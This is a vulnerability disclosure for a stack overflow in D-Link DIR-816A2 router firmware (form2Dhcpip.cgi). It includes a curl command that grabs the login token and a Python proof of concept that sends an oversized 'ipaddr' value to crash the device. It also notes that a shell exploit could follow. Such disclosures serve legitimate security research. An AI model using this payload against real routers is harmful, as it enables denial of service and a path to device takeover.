# DIR-816A2_FWv1.10CNB05_R1B011D88210.img Stack overflow vulnerability

## Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ： http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-816

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

Vulnerability occurs in /goform/form2Dhcpip.cgi. V21 suffers from buffer overflow when lan_assignment is update. The content obtained by the program through ipaddr and nvmacaddr parameters is passed to V2 and V3, and then V3 and V2 are added to the stack of V21. There is no size check, so there is a stack overflow vulnerability.



![](img/2.png#center)
![](img/3.png#center)

## Vulnerability verify

![](img/4.png#center)

![](img/5.png#center)

## POC

Gets the token ID

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Run poc

```python
import requests


tokenid = ''

url = 'http://192.168.0.1/goform/form2Dhcpip.cgi'

payload = b'a' * 10000

data = {
    'tokenid': tokenid,
    'lan_assignment': 'update',
    'nvmacaddr': 'AAAA',
    'ipaddr': payload
}

print('payload sending...')
r = requests.post(url, data)
print('end')
```

You can see the router crash, and finally you can write an exp to get a shell